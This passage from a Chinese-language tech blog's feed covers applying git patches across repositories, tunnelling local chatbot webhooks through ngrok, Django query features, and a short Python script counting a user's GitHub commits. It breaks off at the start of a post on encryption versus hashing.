&lt;p&gt;&lt;code&gt;-k&lt;/code&gt;, &lt;code&gt;--keep-subject&lt;/code&gt;: Do not strip/add [PATCH] from the first line of the commit log message.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;加入 &lt;code&gt;-k&lt;/code&gt; 這個參數的話， commit log 的第一行就不會加上 &lt;code&gt;[PATCH]&lt;/code&gt;。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;git am -k -3 &amp;lt; xxx.patch&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;在我們要加入這些 commits 的 repo 使用這行指令，以我的例子來說就是新 repo。  &lt;ul&gt;
&lt;li&gt;要記住 xxx.patch 的路徑要是對的，因為上個指令產生的 xxx.patch 應該是不會在新 repo 的家目錄底下才對 XD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-k&lt;/code&gt; 是為了接收加了 &lt;code&gt;-k&lt;/code&gt; 參數沒有加了 &lt;code&gt;[PATCH]&lt;/code&gt; 字串的 patch 檔  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;-3&lt;/code&gt; 是使用 three-way merge  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;其實跟 &lt;code&gt;git diff&lt;/code&gt; + &lt;code&gt;git apply&lt;/code&gt; 非常像。  &lt;/p&gt;
&lt;p&gt;&lt;a href="https://stackoverflow.com/a/9507417"&gt;在 StackOverflow 上的這個回答&lt;/a&gt; 直接教你怎麼把這兩個指令合在 1 行解決。  &lt;/p&gt;
&lt;h4&gt;GitHub 支援 &lt;code&gt;git format-patch&lt;/code&gt; 的小功能&lt;/h4&gt;
&lt;p&gt;GitHub 其實可以在 commit, pull request, compare 的網址後面加上 &lt;code&gt;.patch&lt;/code&gt;，就會拿到 &lt;code&gt;git format-patch&lt;/code&gt; 產生的檔案，不過這邊的 output 是沒有加 &lt;code&gt;-k&lt;/code&gt; 參數的，所以會有 "[PATCH]" 字串，以下是範例：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;commit: &lt;a href="https://github.com/zdict/zdict/commit/b871cd6c8a6a71f595fe93132cc9d5c9a71eb82d.patch"&gt;https://github.com/zdict/zdict/commit/b871cd6c8a6a71f595fe93132cc9d5c9a71eb82d.patch&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;pull request: &lt;a href="https://patch-diff.githubusercontent.com/raw/zdict/zdict/pull/149.patch"&gt;https://patch-diff.githubusercontent.com/raw/zdict/zdict/pull/149.patch&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;compare: &lt;a href="https://github.com/zdict/zdict/compare/issue-23.patch"&gt;https://github.com/zdict/zdict/compare/issue-23.patch&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;參考資料&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://stackoverflow.com/questions/5120038/is-it-possible-to-cherry-pick-a-commit-from-another-git-repository/9507417#9507417"&gt;Is it possible to cherry-pick a commit from another git repository? - Stack Overflow&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這邊有列出一些可以做到的方法  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://stackoverflow.com/questions/12320863/how-do-you-take-a-git-diff-file-and-apply-it-to-a-local-branch-that-is-a-copy-o/12320940#12320940"&gt;How do you take a git diff file, and apply it to a local branch that is a copy of the same repository? - Stack Overflow&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這篇解釋了為什麼 "&lt;code&gt;git format-patch&lt;/code&gt; + &lt;code&gt;git am&lt;/code&gt;" 比 "&lt;code&gt;git diff&lt;/code&gt; + &lt;code&gt;git apply&lt;/code&gt;" 好  &lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;A better way to exchange whole commits by file is the combination of the commands git format-patch on the sender and then git am on the receiver, because it also transfers the authorship info and the commit message.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://coderwall.com/p/sgpksw/git-cherry-pick-from-another-repository"&gt;Git cherry-pick from another repository (Example)&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://stackoverflow.com/questions/14509950/my-diff-contains-trailing-whitespace-how-to-get-rid-of-it"&gt;git - My diff contains trailing whitespace - how to get rid of it? - Stack Overflow&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="git"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>利用 ngrok 直接在本機開發 chatbot</title><link href="https://blog.m157q.tw/posts/2017/12/29/ngrok-https-proxy-to-write-chatbot-in-localhost/" rel="alternate"></link><published>2017-12-31T15:54:20+08:00</published><updated>2017-12-31T15:54:20+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-12-29:posts/2017/12/29/ngrok-https-proxy-to-write-chatbot-in-localhost/</id><summary type="html">&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;去年第 4 季部份時間，加上今年上半年大部份時間，幾乎都在做 chatbot 相關的開發。剛開始的時候真的是感到相關開發的工具是很不齊全（當然經過了一年多的發展，現在有更多更方便開發 chatbot 的工具了。），尤其是臺灣最多人用的 Facebook 和 Line 真的是對開發者挺不友善的。主要都是 API 的限制比較多，但 Line 至少還有個官方的 SDK，Facebook Messenger Bot 則連個官方的 SDK 都沒有，基本上都是第三方的，絕大多數都是開發者自己包的。  &lt;/p&gt;
&lt;p&gt;好像有點離題了，總之，一開始開發 Facebook Messenger Bot 的時候，都是在 Webhook 網址填入 Google App Engine service 給的預設網址，每次有改動就要 deploy 上去 GAE，等新版本的 service 正常運作之後，還要再等 Facebook 一段時間才會真的切換到新版本，時間不太一定。一開始還可以接受，但後來就覺得這樣實在是太麻煩了，所以就開始尋找有沒有比較方便的解法。  &lt;/p&gt;
&lt;p&gt;一開始是往「有沒有辦法在本機架一個模擬 Messenger Bot 介面的網頁前端出來」去找，還真的有人寫：&lt;a href="https://github.com/spchuang/fb-local-chat-bot"&gt;https://github.com/spchuang/fb-local-chat-bot&lt;/a&gt;，但因為是獨立開發，而且 Messenger Bot 的介面或 API 其實很常改動，所以我後來沒有採用這個方法。  &lt;/p&gt;
&lt;p&gt;後來詢問了一些人後，才往 web proxy 的方向找，有人推薦我使用免費的 &lt;a href="https://ngrok.com/"&gt;ngrok&lt;/a&gt;：可以拿到一個支援 https 的 web proxy，在 Facebook Messenger Bot 使用的 Webhook 網址填入 ngrok 的 https 網址，之後 Facebook 送到該網址的 request 都會由 ngrok 轉送到本機的某一個 port 上，只要你有在 localhost 把 Messenger Bot 的 Webhook server 執行起來的話，就可以很方便得用自己的手機開啟 chatbot 來邊操作邊即時修改程式碼。  &lt;/p&gt;
&lt;p&gt;作法其實滿簡單的，用了以後開發速度真的加快不少，也可以很即時跟跟 PM 那邊去做確認，確認沒問題了以後再 deploy。而且無論任何語言寫的 chatbot 都可以使用這方法，以下做個介紹。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;介紹&lt;/h2&gt;
&lt;p&gt;官方網站：&lt;a href="https://ngrok.com/"&gt;https://ngrok.com/&lt;/a&gt; 有安裝方式，安裝好後也只要一行指令就可以使用了，我自己是這樣用：  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;ngrok http 8080&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;這樣就會拿到一個接到 local host 8080 port 的 HTTP/HTTPS proxy，至於要用哪個 port 可以自己選擇，不一定要用 8080。  &lt;/p&gt;
&lt;p&gt;執行後，Termianl 就會拿到像下面這樣的畫面：  &lt;/p&gt;
&lt;p&gt;&lt;img alt="ngrok cli" src="/files/ngrok-https-proxy-to-write-chatbot-in-localhost/ngrok-cli.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;也會在 local 開一個 web interface，連入以後的畫面像是這樣：  &lt;/p&gt;
&lt;p&gt;&lt;img alt="ngrok web admin 1" src="/files/ngrok-https-proxy-to-write-chatbot-in-localhost/ngrok-web-admin-1.jpg" /&gt;&lt;br /&gt;
&lt;img alt="ngrok web admin 2" src="/files/ngrok-https-proxy-to-write-chatbot-in-localhost/ngrok-web-admin-2.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;接下來只要把拿到的 https proxy 的 url 填入 chatbot 的 webhook url，然後在 local 把自己開發的 chatbot webhook server 開在接入的 port 就行了。  &lt;/p&gt;
&lt;p&gt;如果是 Google App Engine 的 dev_appserver.py 的話，預設就會開在 8080 port。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;參考來源&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://ngrok.com/"&gt;ngrok - secure introspectable tunnels to localhost&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/inconshreveable/ngrok"&gt;GitHub - inconshreveable/ngrok: Introspected tunnels to localhost&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="ngrok"></category><category term="chatbot"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>關於 Django 的 F() expressions, Q object, Aggregation 的一些筆記</title><link href="https://blog.m157q.tw/posts/2017/12/28/about-django-f-expression-q-object-and-aggregation/" rel="alternate"></link><published>2017-12-28T23:15:00+08:00</published><updated>2017-12-28T23:15:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-12-28:posts/2017/12/28/about-django-f-expression-q-object-and-aggregation/</id><summary type="html">&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;這篇算是在清草稿，約莫一年前紀錄在自己使用的 Trello board 的其中一張 card 裏面。  &lt;/p&gt;
&lt;p&gt;當時接手維護已離職的前同事的專案，是當時將員工內部使用的後台前後分離出來的網頁後端伺服器。他透過使用 Django 的 F() expressions, Q object, Aggregation 創造了一個 base view class（命名為 &lt;code&gt;ModelView&lt;/code&gt;），讓所有繼承這個 base class 的 view 都可以有類似 GraphQL 的效果，可以接收帶有符合 Django Query 參數的 json request 後，直接透過 model 去拿資料，再把資料包成 json response 吐回去。  &lt;/p&gt;
&lt;p&gt;這讓新增新的 API 變得很簡單，只要以下幾個步驟：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;定義好新的 model  &lt;/li&gt;
&lt;li&gt;寫一個新的 View 繼承自 &lt;code&gt;ModelView&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;第一行宣告繼承，第二行寫說對應到哪個 model 就行了  &lt;/li&gt;
&lt;li&gt;只要兩行，所有的 CRUD 以及 response 都會自動處理好  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;在 &lt;code&gt;urls.py&lt;/code&gt; 裡頭新增對應到該 View 的網址  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;真的是用了滿多黑魔法的，我們在開發的時候都開玩笑得說：「這算是『魔改 Django』了吧？」但因為程式碼是放在 private repo，所以以下就只紀錄當時我去 trace source code 時紀錄的一些筆記。  &lt;/p&gt;
&lt;p&gt;最讓我覺得厲害的地方是，前同事 Jay 寫出這個東西之前根本沒碰過 Django，雖然其中也有問我一些問題，但他大概只花 3 個月就寫出這東西，後來我去看他寫的程式碼發現許多地方我看不懂，讓我挺佩服的。有點可惜這裡不能拿程式碼來一一講解就是。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;&lt;a href="https://docs.djangoproject.com/en/1.10/ref/models/expressions/#f-expressions"&gt;&lt;code&gt;F()&lt;/code&gt; expressions&lt;/a&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;An &lt;code&gt;F()&lt;/code&gt; object represents the value of a model field or annotated column. It makes it possible to refer to model field values and perform database operations using them without actually having to pull them out of the database into Python memory.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;不會真的從 db 拿出值，可以減少 db query，讓效能好一點。  &lt;/li&gt;
&lt;li&gt;使用 &lt;code&gt;F()&lt;/code&gt; 以後，要真的更新值的話，必須要使用 &lt;code&gt;refresh_from_db()&lt;/code&gt;，&lt;code&gt;save()&lt;/code&gt; 只會先紀錄而已，並不會真的寫入。  &lt;/li&gt;
&lt;li&gt;可以避免 race condition 的問題，因為每個人不用拿到現在的值以後才去做更改，只要每個動作都有 &lt;code&gt;save()&lt;/code&gt; 的話，最後再一次 &lt;code&gt;refresh_from_db()&lt;/code&gt; 就好。  &lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;F()&lt;/code&gt; assignments persist after &lt;code&gt;Model.save()&lt;/code&gt;  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;如果 &lt;code&gt;save()&lt;/code&gt; 兩次的話，就會作用兩次。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;&lt;a href="https://docs.djangoproject.com/en/1.10/topics/db/queries/#complex-lookups-with-q"&gt;Q object&lt;/a&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Django &lt;code&gt;QuerySet&lt;/code&gt; 的 &lt;code&gt;filter()&lt;/code&gt; 基本上只能處理 AND 的 Query，如果想要使用 OR 或者更複雜一點的 Query 的話，就必須要使用 &lt;code&gt;Q()&lt;/code&gt;。  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;&lt;a href="https://docs.djangoproject.com/en/1.10/topics/db/aggregation/"&gt;Aggregation&lt;/a&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;QuerySet.annotate()&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;回傳一個 &lt;code&gt;QuerySet&lt;/code&gt;，可以給 &lt;code&gt;admin.ModelAdmin&lt;/code&gt; 使用。  &lt;/li&gt;
&lt;li&gt;基本上等同於 SQL 語句的 &lt;code&gt;AS&lt;/code&gt;。  &lt;/li&gt;
&lt;li&gt;可搭配 &lt;code&gt;values()&lt;/code&gt;, &lt;code&gt;order_by()&lt;/code&gt; 做到 SQL 語句的 &lt;code&gt;GROUP BY&lt;/code&gt;。  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;values()&lt;/code&gt; 和 &lt;code&gt;annotate()&lt;/code&gt; 的前後順序生出來的 Query 語句是有差別的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;QuerySet.aggregate()&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;回傳一個 dictionary，基本上就是拿來統計數字用而已。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;使用 &lt;code&gt;print(QuerySet.query)&lt;/code&gt; 來察看 QuerySet 生成的 SQL query statement.  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;後記&lt;/h2&gt;
&lt;p&gt;讓我有點不勝唏噓的是，筆記內容的連結依然是 Django 1.10，一年半前是最新的版本，但現在點進去已經顯示 &lt;strong&gt;"This document is for an insecure version of Django that is no longer supported. Please upgrade to a newer release!"&lt;/strong&gt; 了。  &lt;/p&gt;</summary><category term="Python"></category><category term="Django"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>用 Python 抓出我在前公司貢獻了多少 GitHub commits</title><link href="https://blog.m157q.tw/posts/2017/12/27/fetch-my-github-commits-in-one-organization-with-python-script/" rel="alternate"></link><published>2018-01-13T20:45:13+08:00</published><updated>2018-01-13T20:45:13+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-12-27:posts/2017/12/27/fetch-my-github-commits-in-one-organization-with-python-script/</id><summary type="html">&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;主要是因為&lt;a href="/posts/2017/12/26/i-left-my-first-full-time-job/"&gt;上一篇文章撰寫了離職心得&lt;/a&gt;，在寫的過程中想到，好像可以用 GitHub API 抓一下我在前公司這將近兩年的日子到底送了多少 commits。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;正文&lt;/h2&gt;
&lt;p&gt;廢話不多說，直接進程式碼。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用 Python 3  &lt;/li&gt;
&lt;li&gt;要用到 &lt;a href="https://github.com/sigmavirus24/github3.py"&gt;github3.py&lt;/a&gt; 這個 package  &lt;ul&gt;
&lt;li&gt;請使用 &lt;code&gt;pip install --pre github3.py&lt;/code&gt; 來安裝  &lt;/li&gt;
&lt;li&gt;使用的版本為 &lt;code&gt;github3.py (1.0.0a4)&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;雖然可以直接用帳號密碼登入，但因為我有用 2FA，所以直接產生一組 Access Token 比較方便，也比較安全。  &lt;ul&gt;
&lt;li&gt;可以到 &lt;a href="https://github.com/settings/tokens"&gt;https://github.com/settings/tokens&lt;/a&gt; 產生一組，只需要勾選最基本的 repo 權限就行了，詳細可以參考 &lt;a href="https://help.github.com/articles/creating-a-personal-access-token-for-the-command-line/"&gt;GitHub 的官方教學&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;這個 script 可以拿來算你在某個 organization 的總 commits 數，總共 35 行就搞定了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python3  &lt;/span&gt;

&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;pprint&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;pprint&lt;/span&gt;  

&lt;span class="c1"&gt;# Make sure you&amp;#39;ve installed github3.py via `pip install --pre github3.py`  &lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;github3&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;login&lt;/span&gt;  


&lt;span class="n"&gt;MY_GITHUB_USERNAME&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;  
&lt;span class="c1"&gt;# Visit https://github.com/settings/tokens to create a token if you don&amp;#39;t have.  &lt;/span&gt;
&lt;span class="c1"&gt;# Check &amp;quot;repo&amp;quot; permission  &lt;/span&gt;
&lt;span class="n"&gt;MY_GITHUB_TOKEN&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;  
&lt;span class="n"&gt;TARGET_ORGNIZATION_NAME&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;  

&lt;span class="n"&gt;user&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;login&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;token&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;MY_GITHUB_TOKEN&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="n"&gt;org&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;organization&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;TARGET_ORGNIZATION_NAME&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="n"&gt;my_stats&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;  

&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;repo&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;org&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;repositories&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;  
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;contribution&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;repo&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;contributor_statistics&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;  
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;MY_GITHUB_USERNAME&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;repr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;contribution&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;author&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;  
            &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;repo&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;contribution&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;total&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
            &lt;span class="n"&gt;my_stats&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;repo&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;contribution&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;total&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;  

&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;=&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;80&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;GitHub username: {}&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;MY_GITHUB_USERNAME&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;  
&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Target GitHub organization: {}&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;TARGET_ORGNIZATION_NAME&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;  
&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Total contributed repos: {}&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;my_stats&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt;  
&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Total commits: {}&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;sum&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;commits&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;repo&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;commits&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;my_stats&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt;  

&lt;span class="n"&gt;my_stats_desc_sorted&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;sorted&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;my_stats&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;reverse&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Repo and commits:&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="n"&gt;pprint&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;my_stats_desc_sorted&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;一樣把程式碼開一個 gist 存：&lt;a href="https://gist.github.com/M157q/94be5759d2f13bfdcdd485feff2be3e6"&gt;https://gist.github.com/M157q/94be5759d2f13bfdcdd485feff2be3e6&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;結果&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;GitHub username: M157q  
Target GitHub organization: Tagtoo  
Total contributed repos: 36  
Total commits: 1521  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;總共在 36 個 repos 貢獻了 1521 個 commits，由於大多是 private repo，所以就不一一秀出了。&lt;br /&gt;
這邊只有算在 master branch 上的 commits 而已，不包含 issue 跟 PR。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;參考資料&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://hvelarde.blogspot.tw/2014/01/how-to-get-statistics-about-your.html"&gt;hvelarde: How to get statistics about your contributions on a GitHub organization&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="GitHub"></category><category term="Python"></category><category term="Python 3"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>加密和雜湊有什麼不一樣？</title><link href="https://blog.m157q.tw/posts/2017/12/25/differences-between-encryption-and-hashing/" rel="alternate"></link><published>2017-12-26T12:29:40+08:00</published><updated>2017-12-26T12:29:40+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-12-25:posts/2017/12/25/differences-between-encryption-and-hashing/</id><summary type="html">&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;其實雜湊（Hash）的部份，本來是打算放在 &lt;a href="/posts/2017/12/23/differences-between-encryption-compression-and-encoding/"&gt;如何區分加密、壓縮、編碼&lt;/a&gt; 這篇一起講。但在撰寫的過程中發覺雜湊跟其他三者相比起來的差異性較大，一起講其實蠻突兀的，不太好比較。而且我自己目前看到的狀況是，雜湊比較容易跟加密搞混，所以才獨立出這篇來講一下雜湊與加密的關係。  &lt;/p&gt;
&lt;p&gt;你可能或多或少都有看過或聽過「MD5 加密」、「MD5 解密」、「SHA-1 加密」、「SHA-1 解密」、「雜湊加密演算法」。但 MD5 和 SHA-1 實際上並不是加密演算法，而是雜湊演算法。究竟加密跟雜湊到底有什麼不一樣，又該如何區分，這篇會簡單講解一下。  &lt;/p&gt;
&lt;p&gt;因為加密的部份已經在 &lt;a href="/posts/2017/12/23/differences-between-encryption-compression-and-encoding/"&gt;如何區分加密、壓縮、編碼&lt;/a&gt; 這篇提過了，所以就不重述，還不清楚的人歡迎點擊上述文章連結前去察看。以下會先講雜湊的特性，再講雜湊跟加密的區別。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;雜湊（Hash）&lt;/h3&gt;
